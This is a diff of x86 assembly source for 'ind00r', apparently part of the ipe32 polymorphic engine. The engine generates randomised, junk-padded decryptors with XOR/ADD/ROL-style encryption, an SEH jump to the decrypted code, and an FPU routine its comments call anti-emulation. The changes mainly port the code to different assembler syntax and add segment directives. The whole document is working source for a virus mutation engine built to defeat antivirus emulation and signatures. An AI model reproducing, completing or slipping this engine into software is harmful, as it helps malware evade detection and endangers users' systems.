@@ -15,6 +15,23 @@
 ;
 RANDOM_SEED     equ 0BABAh * 65536 + 0BABEh
 MAX_POLY_SIZE   equ 3072
+
+; procedure number constantz
+LOAD_POINTER    equ   00h
+LOAD_COUNTER    equ   01h
+LOAD_KEY        equ   02h
+DECRYPT_DATA    equ   03h
+INC_KEY         equ   04h               ; increment key
+INC_POINTER     equ   05h               ; increment pointer by 4
+DEC_COUNTER     equ   06h               ; decrement counter by 1
+FPU_FOOL        equ   07h               ; some anti emulatin' stuff
+JUNK_PROC       equ   08h
+JUNK_PROCS      equ   04h               ; maximal junk procedure count - 1
+MAX_PROCS       equ   JUNK_PROC + JUNK_PROCS + 1
+MIN_PROCS       equ   JUNK_PROC + 1
+
+MAX_PARAMS      equ   04h               ; maximal number of parameters
+
 ; main procedure: ind00r
 ; parameters:
 ;
@@ -38,6 +55,11 @@ MAX_POLY_SIZE   equ 3072
 ;                the size of the poly decryptor!
 ;
 ; NOTE: 'Ä' is equal to 'points to'
+
+                .386p
+                .model flat
+
+text           segment
 ;
 ; the decryptor constists of junk procedures, decryptor procedures, main
 ; loop calling the procedures and finally jump to the start address to the
@@ -53,15 +75,17 @@ ind00r_delta:   mov   al, JMP_LONG               ; write jump to main loop
                 call  iGenProcs                  ; generate procedures
                 push  edi                        ; here we want to jump
                 call  RelLongJmp                 ; reloc jump to main loop
-                or    byte ptr [ebp.nojunk-idelta], 0FFh
+                or    byte ptr [ebp+nojunk-idelta], 0FFh
                 call  iGenLoop                   ; generate main loop
                 call  iSEHJump
-                sub   edi, [esp.PUSHAD_EDI]      ; calculate decryptor size
-                mov   [esp.PUSHAD_ECX], edi      ; ECX = size
+                sub   edi, [esp+PUSHAD_EDI]      ; calculate decryptor size
+                mov   [esp+PUSHAD_ECX], edi      ; ECX = size
                 call  iEncrypt                   ; encrypt code!
                 popad                            ; restore all registers
                 ret                              ; return
 ind00r          endp
+
+
 ; main procedure: init
 iInit           proc
                 ; first of all, calculate new delta offset
@@ -69,11 +93,11 @@ iInit           proc
                 add   ebp, idelta - offset ind00r_delta ; calculate delta
                                                         ; offset
                 ; now init random seed
-                push  dword ptr [ebp.RandomConst-idelta]
-                pop   dword ptr [ebp.RandomSeed-idelta]
+                push  dword ptr [ebp+RandomConst-idelta]
+                pop   dword ptr [ebp+RandomSeed-idelta]
 
                 push  edi                   ; push destination index
-                lea   edi, [ebp.InitValues-idelta] ; table with init values
+                lea   edi, [ebp+InitValues-idelta] ; table with init values
 
                 ; let's store parameterz
                 stosd                       ; store size of junk space
@@ -87,7 +111,7 @@ iInit           proc
                 stosd                       ; address of code
 
                 ; mix the registers
-                lea   esi, [ebp.preg-idelta]
+                lea   esi, [ebp+preg-idelta]
                 push  USED_REGS
                 call  MixBytes
 
@@ -95,26 +119,26 @@ iInit           proc
                 push  JUNK_PROCS      ; 0 - 3
                 call  rnd32r
                 add   al, MIN_PROCS
-                mov   [ebp.ProcCount-idelta], al   ; number of procedures
+                mov   [ebp+ProcCount-idelta], al   ; number of procedures
 
                 ; put the procedures in random order
-                lea   esi, [ebp.ProcedureOrder-idelta]
+                lea   esi, [ebp+ProcedureOrder-idelta]
                 push  eax
                 call  MixBytes
 
                 ; put procedure calls in random order
-                lea   esi, [ebp.CallOrder1-idelta]
+                lea   esi, [ebp+CallOrder1-idelta]
                 push  CALL_ORDER_1
                 call  MixBytes
 
-                lea   esi, [ebp.CallOrder2-idelta]
+                lea   esi, [ebp+CallOrder2-idelta]
                 mov   ecx, eax
                 sub   al, CALL_ORDER_2 + 1
                 push  eax
                 call  MixBytes
 
                 ; get random parameter count for each procedure
-                lea   edi, [ebp.ProcParameters-idelta]
+                lea   edi, [ebp+ProcParameters-idelta]
                 mov   cl, MAX_PROCS
 i_par_loop:     push  MAX_PARAMS + 03h       ;   0 - MAX_PARAMS + 2
                 call  rnd32r
@@ -127,7 +151,7 @@ i_lamest:       stosb
                 stosb
 
                 ; get random key, encryption & key increment type
-                lea   edi, [ebp.CryptKey-idelta]
+                lea   edi, [ebp+CryptKey-idelta]
                 call  rnd32
                 stosd                        ; write key
                 call  rnd32
@@ -139,13 +163,13 @@ i_lamest:       stosb
                 call  rnd32r
                 stosb                        ; write key increment type
                 pop   edi                    ; pop destination index
-                and   word ptr [ebp.InLoop-idelta], 00h
+                and   word ptr [ebp+InLoop-idelta], 00h
                 ret
 iInit           endp
 ; main procedure: encrypt
 iEncrypt        proc
                 pushad
-                lea   esi, [ebp.CryptSize-idelta]
+                lea   esi, [ebp+CryptSize-idelta]
                 lodsd                   ; CryptSize
                 xchg  eax, ebx
                 lodsd                   ; EncryptRVA
@@ -155,7 +179,7 @@ iEncrypt        proc
                 lodsd                   ; KeyIncrement
                 xchg  eax, edx
 
-encrypt_loop:   mov   al, [ebp.CryptType-idelta] ; get encryption type
+encrypt_loop:   mov   al, [ebp+CryptType-idelta] ; get encryption type
                 cmp   al, ENC_XOR         ; XOR encryption?
                 jnz   ie_not_xor          ; no, check next
                 xor   [edi], ecx          ; yes, XOR [preg], key
@@ -172,7 +196,7 @@ ie_not_rol:     cmp   al, ENC_ROR         ; ROR decryption?
                 jnz   ie_not_ror          ; no, jmp to key increment
                 rol   dword ptr [edi], cl ; rotate dword
 ie_not_ror:     xchg  ecx, edx
-                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
+                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                 cmp   al, KEY_ROL         ; ROL key increment?
                 jnz   ie_n_rol            ; no, check next
                 rol   edx, cl             ; rotate key
@@ -196,7 +220,7 @@ iEncrypt        endp
 ;                 instructions.
 iGenProcs       proc
                 ; get number of procedures into counter
-                movzx ecx, byte ptr [ebp.ProcCount-idelta]
+                movzx ecx, byte ptr [ebp+ProcCount-idelta]
                 xor   ebx, ebx  ; set up another counter that counts from 0
 
                 ; for choosin' procedures
@@ -206,15 +230,15 @@ iGenProcs       proc
 gp_loop:        push  ecx
                 ; getting number of current procedure
                 push  ebx
-                movzx ebx, byte ptr [ebp.ProcedureOrder-idelta+ebx]
+                movzx ebx, byte ptr [ebp+ProcedureOrder-idelta+ebx]
                                                     ; ID # of 1st procedure
-                mov   [ebp.CurrentProc-idelta], bl  ; for junk gen to
+                mov   [ebp+CurrentProc-idelta], bl  ; for junk gen to
                                                     ; identify current proc
                 ; store procedure address
-                mov   [ebp.ProcAddress-idelta+4*ebx], edi
+                mov   [ebp+ProcAddress-idelta+4*ebx], edi
 
                 ; get number of parameters
-                mov   dl, [ebp.ProcParameters-idelta+ebx]
+                mov   dl, [ebp+ProcParameters-idelta+ebx]
                 test  dl, dl                  ; if no parameter,
                 jz    gp_np_entry             ; generate no entry
                 ; if procedure has parameters we need to set up EBP
@@ -237,7 +261,7 @@ gp_np_entry:    push  ebx
                 pop   ebx
                 cmp   ebx, JUNK_PROC
                 jnb   gp_junk_proc
-                mov   esi, [ebp.Generatorz-idelta+ebx*4]
+                mov   esi, [ebp+Generatorz-idelta+ebx*4]
                 add   esi, ebp
                 push  edx
                 call  esi                     ; call di generator
@@ -268,25 +292,27 @@ gp_par:         call  WriteJunk
                 pop   ebx
                 inc   ebx                       ; increment count
                 pop   ecx
-                loop  gp_loop
+                dec   ecx
+                jnz  gp_loop
+                ;loop  gp_loop
                 ret
 iGenProcs       endp
 ; generates main loop with some junk between callz.
 iGenLoop        proc
-                or    byte ptr [ebp.InLoop-idelta], 01h
-                lea   esi, [ebp.CallOrder1-idelta]
-                movsx ecx, byte ptr [ebp.ProcCount-idelta]
-                or    byte ptr [ebp.CurrentProc-idelta], 0FFh
+                or    byte ptr [ebp+InLoop-idelta], 01h
+                lea   esi, [ebp+CallOrder1-idelta]
+                movsx ecx, byte ptr [ebp+ProcCount-idelta]
+                or    byte ptr [ebp+CurrentProc-idelta], 0FFh
 gl_call_lp:     xor   eax, eax
                 lodsb                           ; get numbah of proc
                 xchg  eax, ebx
-                inc   byte ptr [ebp.CurrentProc-idelta]
-                cmp   byte ptr [ebp.CurrentProc-idelta], DECRYPT_DATA
+                inc   byte ptr [ebp+CurrentProc-idelta]
+                cmp   byte ptr [ebp+CurrentProc-idelta], DECRYPT_DATA
                 jne   gl_yxcmv
                 push  edi
 gl_yxcmv:
                 push  ecx
-                movsx ecx, byte ptr [ebp.ProcParameters-idelta+ebx]
+                movsx ecx, byte ptr [ebp+ProcParameters-idelta+ebx]
                 push  ebx
                 test  ecx, ecx                  ; 0 parameterz?
                 jz    gl_no_par                 ; don't loop
@@ -295,7 +321,7 @@ gl_push_lp:
                 loop  gl_push_lp
 gl_no_par:
                 pop   ebx
-                mov   edx, [ebp.ProcAddress-idelta+4*ebx]
+                mov   edx, [ebp+ProcAddress-idelta+4*ebx]
                 mov   byte ptr [edi], CALL_DIRECT ; write call opcode
                 inc   edi
                 neg   edi
@@ -304,7 +330,7 @@ gl_no_par:
                 stosd
                 pop   ecx                       ; outer loop counter
                 loop  gl_call_lp
-                mov   bl, [ebp.creg-idelta]    ; generate check if counter
+                mov   bl, [ebp+creg-idelta]    ; generate check if counter
                 call  gCheckReg                ; reg is zero
                 mov   ax, ESC_2BYTE xor ((JMPC_LONG xor COND_NE) * 100h)
                 stosw                            ; generate JNZ
@@ -317,7 +343,7 @@ gl_no_par:
 iGenLoop        endp
 ; generate jump to code
 iSEHJump        proc
-                mov   edx, [ebp.DecryptRVA-idelta] ; where to jump after
+                mov   edx, [ebp+DecryptRVA-idelta] ; where to jump after
                                                    ; decryption
 
                 ; 1. let's put offset to code on stack
@@ -426,28 +452,28 @@ isj_suck0:      pop   ecx
 iSEHJump        endp
 ; load start RVA into pointer register
 iProcLdPtr      proc
-                mov   edx, [ebp.DecryptRVA-idelta]
-                mov   bl, [ebp.preg-idelta]
+                mov   edx, [ebp+DecryptRVA-idelta]
+                mov   bl, [ebp+preg-idelta]
                 jmp   gLoadReg
 iProcLdPtr      endp
 ; load size into counter register
 iProcLdCnt      proc
-                mov   edx, [ebp.CryptSize-idelta]
-                mov   bl, [ebp.creg-idelta]
+                mov   edx, [ebp+CryptSize-idelta]
+                mov   bl, [ebp+creg-idelta]
                 jmp   gLoadReg
 iProcLdCnt      endp
 ; load key into key register
 iProcLdKey      proc
-                mov   edx, [ebp.CryptKey-idelta]
-                mov   bl, [ebp.kreg-idelta]
+                mov   edx, [ebp+CryptKey-idelta]
+                mov   bl, [ebp+kreg-idelta]
                 jmp   gLoadReg
 iProcLdKey      endp
 ; decrypt data word
 iProcDecData    proc
-                mov   cl, [ebp.preg-idelta]  ; operand = ptr reg
+                mov   cl, [ebp+preg-idelta]  ; operand = ptr reg
                 call  rnd32                  ; get random bit
                 mov   bl, 08h
-                cmp   byte ptr [ebp.CryptType-idelta], ENC_SUB
+                cmp   byte ptr [ebp+CryptType-idelta], ENC_SUB
                 jbe   dd_not_chk_ecx
                 cmp   cl, REG_ECX
                 jne   dd_not_chk_ecx
@@ -477,7 +503,7 @@ dd_get_jnk_reg: call  iGetJunkReg
                 call  iBlockJunkAR
 blaaah:
                 ; test for encryption type
-                mov   al, [ebp.CryptType-idelta]
+                mov   al, [ebp+CryptType-idelta]
                 cmp   al, ENC_XOR
                 jnz   dd_not_xor
                 mov   bh, OPTYPE_XOR   ; generate XOR jreg/[preg], kreg
@@ -492,7 +518,7 @@ dd_not_sub:     ja    dd_rotate        ; generate ROR/ROL jreg/[preg], kreg
                 push  ecx
                 mov   al, OPSIZE_32
                 mov   ah, MEM_REG
-                mov   bl, [ebp.kreg-idelta]
+                mov   bl, [ebp+kreg-idelta]
                 xor   ch, ch
                 xor   esi, esi
                 call  ciOpRMReg
@@ -524,7 +550,7 @@ dd_rotate:      push  ecx              ; code reg/pointer reg
                 ;
                 ; junkreg must not be ECX
 
-                mov   al, [ebp.kreg-idelta]    ; load key register
+                mov   al, [ebp+kreg-idelta]    ; load key register
 
                 cmp   al, REG_ECX              ; ECX?
                 jz    dd_no_push               ; yes, no need to push ecx
@@ -596,7 +622,7 @@ dd_exit:        pop   ebx                      ; pop code/ptr reg
                 jnz   dd_not_save_reg
                 and   ebx, REG_EDI
                 call  iBlockJunkAR
-                mov   cl, [ebp.preg-idelta]
+                mov   cl, [ebp+preg-idelta]
                 mov   bh, OPTYPE_MOV
                 call  rnd32
                 and   al, 02h
@@ -612,11 +638,11 @@ iProcDecData    endp
 
 ; increment key
 iProcIncKey     proc
-                mov   edx, [ebp.KeyIncrement-idelta] ; load key increment
+                mov   edx, [ebp+KeyIncrement-idelta] ; load key increment
                 call  iGetJunkReg                    ; get random junk reg
                 xchg  eax, ecx
                 mov   ebx, ecx
-                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
+                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                 mov   bh, OPTYPE_ADD              ; first assume ADD
                 cmp   al, KEY_DEC                 ; check if decrement key
                 jnz   pik_not_sub                 ; nope, ADD
@@ -632,7 +658,7 @@ pik_not_sub:    ja    pik_rotate                  ; > KEY_DEC: rotate!
                 pop   ebx
                 call  iBlockJunkAR
                 xor   bl, MOD_REG
-                mov   cl, [ebp.kreg-idelta]      ; get key reg
+                mov   cl, [ebp+kreg-idelta]      ; get key reg
                 xor   ecx, 0FFFFFF00h xor MOD_REG
                 push  02h
                 call  rnd32r
@@ -646,7 +672,7 @@ pik_blah:
 pik_direct:
                 mov   al, OPSIZE_32
                 mov   bl, bh
-                mov   cl, [ebp.kreg-idelta]
+                mov   cl, [ebp+kreg-idelta]
                 or    ecx, 0FFFFFF00h xor MOD_REG
 
                 jmp   ciOpRMImm
@@ -660,7 +686,7 @@ pik_not_ror:    mov   ah, dl
                 and   ah, 1Fh
                 mov   bh, SHIFT_IMM
                 mov   al, OPSIZE_32
-                mov   cl, [ebp.kreg-idelta]
+                mov   cl, [ebp+kreg-idelta]
                 xor   cl, MOD_REG
                 call  ciShiftRM
                 ret
@@ -669,7 +695,7 @@ iProcIncKey     endp
 iProcIncPtr     proc
                 push  04h                       ; we have 4 methods
                 call  rnd32r                    ; to do so
-                mov   cl, [ebp.preg-idelta]
+                mov   cl, [ebp+preg-idelta]
                 xor   cl, MOD_REG               ; pointer reg, of course
                 push  04h
                 pop   edx                       ; mov edx, 4 (optimized :P)
@@ -708,7 +734,7 @@ iProcIncPtr     endp
 iProcDecCnt     proc
                 push  05h
                 call  rnd32r
-                mov   cl, [ebp.creg-idelta]
+                mov   cl, [ebp+creg-idelta]
                 or    cl, MOD_REG
                 xor   edx, edx
                 test  al, al
@@ -716,7 +742,7 @@ iProcDecCnt     proc
 
                 ; generate DEC creg
                 mov   al, DEC_REG
-                or    al, [ebp.creg-idelta]
+                or    al, [ebp+creg-idelta]
                 stosb
                 ret
 pdc_not_dec:    cmp   al, 01h
@@ -793,7 +819,7 @@ iProcFPUFool    proc
                 ; calculate address of method and execute it!
                 pop   eax
                 push  eax
-                mov   ebx, [ebp.gf_methods-idelta+4*eax]
+                mov   ebx, [ebp+gf_methods-idelta+4*eax]
                 add   ebx, ebp
                 call  ebx
 
@@ -811,7 +837,7 @@ iProcFPUFool    proc
 
                 pop   eax
                 push  edi            ; label1 in ECX (see below)
-                movzx edx, byte ptr [ebp.gf_rslt_table-idelta+eax]
+                movzx edx, byte ptr [ebp+gf_rslt_table-idelta+eax]
                 push  03h
                 call  rnd32r
                 add   al, OPTYPE_SUB            ; SUB, CMP or XOR
@@ -954,14 +980,14 @@ iProcJunk       endp
 iBlockJunk      proc
                 mov   bl, 08h
 iBlockJunkAR:                            ; avoid register in ebx
-                test  byte ptr [ebp.nojunk-idelta], 0FFh
+                test  byte ptr [ebp+nojunk-idelta], 0FFh
                 jz    bj_sueder
                 ret
 bj_sueder:
                 pushad
                 push  BJ_BLOCKCNT        ; choose between multiple methods
                 call  rnd32r
-                mov   edx, [ebp.bj_blockz-idelta+4*eax] ; get address of
+                mov   edx, [ebp+bj_blockz-idelta+4*eax] ; get address of
                 add   edx, ebp           ; method procedure & relocate
 bj_nxtr:        call  iGetJunkReg        ; get a junk reg
                 cmp   al, bl             ; test if we shouldn't touch it
@@ -1065,7 +1091,7 @@ iRndJunk        proc
                 xchg  eax, ecx
 rndj_loop:      push  JUNKGEN_CNT
                 call  rnd32r
-                mov   eax, [ebp.JunkGen-idelta+4*eax]
+                mov   eax, [ebp+JunkGen-idelta+4*eax]
                 add   eax, ebp
                 push  ecx
                 push  ebx
@@ -1083,7 +1109,7 @@ iRndJunk        endp
 iRegJunk        proc
                 push  RJ_METHCNT
                 call  rnd32r
-                mov   ecx, [ebp.rj_methods-idelta+4*eax]
+                mov   ecx, [ebp+rj_methods-idelta+4*eax]
                 add   ecx, ebp
                 call  iOpSizeReg
                 jmp   ecx
@@ -1258,7 +1284,7 @@ iRndRegJ        endp
 iMemJunk        proc
                 push  MJ_METHCNT
                 call  rnd32r
-                mov   edx, [ebp.mj_methods-idelta+4*eax]
+                mov   edx, [ebp+mj_methods-idelta+4*eax]
                 add   edx, ebp
                 push  OPSIZE_16 + 1
                 call  rnd32r
@@ -1350,23 +1376,23 @@ iGetMemory      proc
                 push  eax
 gm_rep:         xor   eax, eax
                 mov   al, GM_METHCNT2
-                cmp   byte ptr [ebp.CurrentProc-idelta], DECRYPT_DATA
+                cmp   byte ptr [ebp+CurrentProc-idelta], DECRYPT_DATA
                 jb    gm_push
                 inc   eax
                 inc   eax
-gm_push:        sub   al, [ebp.InLoop-idelta]
+gm_push:        sub   al, [ebp+InLoop-idelta]
                 push  eax
                 call  rnd32r
-                add   al, [ebp.InLoop-idelta]
-                mov   eax, [ebp.gm_methods-idelta+4*eax]
+                add   al, [ebp+InLoop-idelta]
+                mov   eax, [ebp+gm_methods-idelta+4*eax]
                 add   eax, ebp
                 call  eax
                 pop   eax
                 ret
 
                 ; get random parameter
-gm_meth1:       movzx eax, byte ptr [ebp.CurrentProc-idelta]
-                mov   al, [ebp.ProcParameters-idelta+eax] ; parameter count
+gm_meth1:       movzx eax, byte ptr [ebp+CurrentProc-idelta]
+                mov   al, [ebp+ProcParameters-idelta+eax] ; parameter count
                 test  eax, eax
                 jz    gm_m1_ebp    ; if no parameter, don't use this method
                 push  eax
@@ -1380,33 +1406,33 @@ gm_m1_ebp:      mov   cl, REG_EBP xor MOD_REG
                 ret
 
                 ; get random junk mem
-gm_meth2:       mov   eax, [ebp.JunkSpSize-idelta] ; access a random dword
+gm_meth2:       mov   eax, [ebp+JunkSpSize-idelta] ; access a random dword
                 shl   eax, 02h
                 dec   eax
                 dec   eax
                 dec   eax
                 push  eax
                 call  rnd32r                      ; from junk memory
-                add   eax, [ebp.JunkSpRVA-idelta] ; add start rva
+                add   eax, [ebp+JunkSpRVA-idelta] ; add start rva
                 xchg  eax, esi
                 mov   cx, MOD_DIRECT              ; return a direct address
                 ret
 
                 ; get random encrypted data
-gm_meth3:       mov   eax, [ebp.CryptSize-idelta]
+gm_meth3:       mov   eax, [ebp+CryptSize-idelta]
                 shl   eax, 02h
                 dec   eax
                 dec   eax
                 dec   eax
                 push  eax
                 call  rnd32r
-                add   eax, [ebp.DecryptRVA-idelta]
+                add   eax, [ebp+DecryptRVA-idelta]
                 xchg  eax, esi
                 mov   cx, MOD_DIRECT
                 ret
 
                 ; get encrypted data (RVA + 1/2/4*counter)
-gm_meth4:       mov   esi, [ebp.DecryptRVA-idelta]
+gm_meth4:       mov   esi, [ebp+DecryptRVA-idelta]
                 push  03h                   ; scaling factor 1, 2 or 4
                 call  rnd32r
                 mov   ecx, eax
@@ -1417,13 +1443,13 @@ gm_meth4:       mov   esi, [ebp.DecryptRVA-idelta]
                 sub   esi, edx
                 pop   edx
                 shl   eax, 03h
-                xor   al, [ebp.creg-idelta]
+                xor   al, [ebp+creg-idelta]
                 mov   ch, al
                 mov   cl, MOD_DIRECT
                 ret
 
                 ; get current encrypted dword
-gm_meth5:       movsx cx, byte ptr [ebp.preg-idelta]  ; use [preg] without
+gm_meth5:       movsx cx, byte ptr [ebp+preg-idelta]  ; use [preg] without
                 xor   esi, esi                        ; displacement
                 ret
 
@@ -1442,7 +1468,7 @@ iGetWrMem       proc
                 push  eax
                 push  GM_METHCNT3 - 1
                 call  rnd32r
-                mov   eax, [ebp.gm_methods-idelta+4+4*eax]
+                mov   eax, [ebp+gm_methods-idelta+4+4*eax]
                 add   eax, ebp
                 call  eax
                 pop   eax
@@ -1459,7 +1485,7 @@ iGetPar         endp
 iGetJunkReg     proc
                 push  03h
                 call  rnd32r
-                movzx eax, byte ptr [ebp.junkreg1-idelta+eax]
+                movzx eax, byte ptr [ebp+junkreg1-idelta+eax]
                 ret
 iGetJunkReg     endp
 
@@ -1467,7 +1493,7 @@ iPushJunk       proc
                 pushad
                 push  PP_METHCNT                ; random method to push
                 call  rnd32r                    ; a parameter
-                mov   eax, [ebp.pp_methods-idelta+4*eax]
+                mov   eax, [ebp+pp_methods-idelta+4*eax]
                 add   eax, ebp
                 call  eax                       ; call da method
                 mov   [esp], edi
@@ -1549,7 +1575,7 @@ iPopJunk        endp
 rnd32           proc; [no parameterz]
                 push  ecx
                 push  edx
-                mov   eax, [ebp.RandomSeed-idelta] ; load random seed
+                mov   eax, [ebp+RandomSeed-idelta] ; load random seed
                 mov   ecx, eax
                 mov   edx, eax
                 not   ecx
@@ -1565,7 +1591,7 @@ rnd32_loop:     push  ecx
                 pop   ecx
 rnd32_blah:     loop  rnd32_loop
                 xor   eax, edx
-                mov   [ebp.RandomSeed-idelta], eax ; write back random seed
+                mov   [ebp+RandomSeed-idelta], eax ; write back random seed
                 pop   edx
                 pop   ecx
                 ret
@@ -1588,7 +1614,7 @@ rnd32r          endp
 ; 'xchanges n bytes from address ESI (n has to be pushed)
 MixBytes        proc; [count] [esi = ptr]
                 pushad                    ; preserve all registers
-                mov   ebx, [esp.PUSHAD_SIZE+04h]
+                mov   ebx, [esp+PUSHAD_SIZE+04h]
                 mov   ecx, ebx
                 shl   ecx, 01h            ; loop counter (2 * # of bytes)
 
@@ -1625,12 +1651,12 @@ WriteJunk       endp
 
 ; returns reg if it is a junk reg, otherwise -1
 iIsJReg         proc
-                mov   eax, [esp.04h]
-                cmp   [ebp.junkreg1-idelta], al
+                mov   eax, [esp+04h]
+                cmp   [ebp+junkreg1-idelta], al
                 je    is_junkreg
-                cmp   [ebp.junkreg2-idelta], al
+                cmp   [ebp+junkreg2-idelta], al
                 je    is_junkreg
-                cmp   [ebp.junkreg3-idelta], al
+                cmp   [ebp+junkreg3-idelta], al
                 je    is_junkreg
                 xor   eax, eax
                 dec   eax
@@ -1789,7 +1815,7 @@ glr_notword:    inc   eax
 
                 push  GLR_METHCNT       ; choose between some methods
                 call  rnd32r
-                mov   eax, [ebp.glr_methods-idelta+eax*4] ; load method
+                mov   eax, [ebp+glr_methods-idelta+eax*4] ; load method
                 add   eax, ebp          ; relocate pointer to subroutine
                 jmp   eax               ; jump to method.
 
@@ -1894,8 +1920,8 @@ gLoadReg        endp
 RelLongJmp      proc; [address], [address of disp]
                 push  eax
                 push  edi
-                mov   eax, [esp.0Ch]        ; where to jump
-                mov   edi, [esp.10h]        ; address of displacement
+                mov   eax, [esp+0Ch]        ; where to jump
+                mov   edi, [esp+10h]        ; address of displacement
                 neg   edi
                 lea   eax, [eax+edi-04h]
                 neg   edi
@@ -2477,21 +2503,6 @@ CurrentProc     db    ?                 ; identifies current procedure when
 InLoop          db    ?                 ; boolean, if true we are
                                         ; generating decryptor loop
 nojunk          db    ?
-; procedure number constantz
-LOAD_POINTER    equ   00h
-LOAD_COUNTER    equ   01h
-LOAD_KEY        equ   02h
-DECRYPT_DATA    equ   03h
-INC_KEY         equ   04h               ; increment key
-INC_POINTER     equ   05h               ; increment pointer by 4
-DEC_COUNTER     equ   06h               ; decrement counter by 1
-FPU_FOOL        equ   07h               ; some anti emulatin' stuff
-JUNK_PROC       equ   08h
-MAX_PROCS       equ   JUNK_PROC + JUNK_PROCS + 1
-MIN_PROCS       equ   JUNK_PROC + 1
-JUNK_PROCS      equ   04h               ; maximal junk procedure count - 1
-
-MAX_PARAMS      equ   04h               ; maximal number of parameters
 
 ; encryption type constantz
 ENC_XOR       equ 00000000b             ; xor encryption
@@ -2810,3 +2821,6 @@ FPU_WAIT        equ   09Bh
 FPU_STORE       equ   02h
 FPU_LOAD        equ   00h
 ; end of ipe32
+
+
+text            ends
